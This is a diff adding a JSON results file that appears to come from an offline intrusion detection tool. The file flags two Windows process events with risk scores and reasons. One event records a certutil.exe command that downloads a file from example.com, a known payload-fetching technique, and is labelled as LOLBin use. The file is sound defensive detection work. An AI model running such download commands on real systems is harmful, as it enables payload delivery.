@@ -1,0 +1,23 @@
+[
+  {
+    "newProcessName": "c:\\windows\\system32\\certutil.exe",
+    "parentProcessName": "c:\\windows\\system32\\cmd.exe",
+    "reasons": [
+      "Known LOLBin executed: certutil.exe",
+      "Unusual parent process: c:\\windows\\system32\\cmd.exe"
+    ],
+    "riskScore": 3,
+    "commandLine": "certutil.exe  -urlcache -split -f https://example.com dummy.exe"
+  },
+  {
+    "newProcessName": "c:\\windows\\system32\\cmd.exe",
+    "parentProcessName": "c:\\windows\\explorer.exe",
+    "reasons": [
+      "Batch or PowerShell script invoked",
+      "Command execution using cmd or PowerShell /c",
+      "Unusual parent process: c:\\windows\\explorer.exe"
+    ],
+    "riskScore": 3,
+    "commandLine": "\"c:\\windows\\system32\\cmd.exe\" /c \"d:\\programming\\java_projects\\offlineintrusiondetectionassistance-main\\src\\app\\test.bat\" "
+  }
+]
